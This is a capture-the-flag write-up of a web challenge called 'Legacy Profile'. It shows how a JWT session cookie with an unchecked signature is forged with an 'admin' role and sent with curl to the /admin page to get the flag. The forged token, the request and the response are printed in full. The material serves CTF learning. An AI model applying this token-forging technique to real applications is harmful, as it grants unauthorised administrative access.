# Legacy Profile

## Description

A small portal that lets users update their info, what could go wrong?

## Solve

Upon opening the page we can see a login page! `/login`

![photo](1.png)

But we can also register accounts! `/register`

![photo](2.png)

Registering a simple account gets us on the `/profile` page

![photo](3.png)

We have, display name, bio but on the top bar we also have the `admin` button.

Firstly lets check the cookies!

Inside we have a `session` jwt cookie that looks like this:
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0IiwiZGlzcGxheU5hbWUiOiIxMjM0IiwiYmlvIjoiIiwicm9sZSI6InVzZXIifQ.legacy-signature`

It has a bad signature, so that means that we can forge a jwt cookie with the `admin` role.

`jwt.io` is a good website

![photo](4.png)

Going over to the `JWT Encoder`, we can just switch the role to `admin` in the `payload` section.

![photo](5.png)

So our `forged` cookie looks like this:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0IiwiZGlzcGxheU5hbWUiOiIxMjM0IiwiYmlvIjoiIiwicm9sZSI6ImFkbWluIn0._Wond4KR9cxPnVqnXinsKr5SK8HO2-3OtwgT1hzsSaY`

Now we can use this cookie to get the flag!

We can simple use a `curl` command to do this or into the browser:

```bash
┌──(lifip㉿justalaptop)-[~/0day/writeups]
└─$ curl 'http://194.102.62.166:27246/admin' \
  -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0IiwiZGlzcGxheU5hbWUiOiIxMjM0IiwiYmlvIjoiIiwicm9sZSI6ImFkbWluIn0._Wond4KR9cxPnVqnXinsKr5SK8HO2-3OtwgT1hzsSaY'
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Admin</title>
    <link rel="stylesheet" href="/style.css">
  </head>
  <body>
    <main class="shell">
      <header>
        <a class="brand" href="/profile">Legacy Profile</a>
        <nav><a href="/profile">Profile</a><a href="/admin">Admin</a><a href="/logout">Logout</a></nav>
      </header>

    <section class="panel">
      <p class="eyebrow">Admin</p>
      <h1>Portal control</h1>
      <pre>ZDTM{congrats_you_solved_an_easy_one}</pre>
    </section>

    </main>
  </body>
</html>
```

### Flag: 
ZDTM{congrats_you_solved_an_easy_one}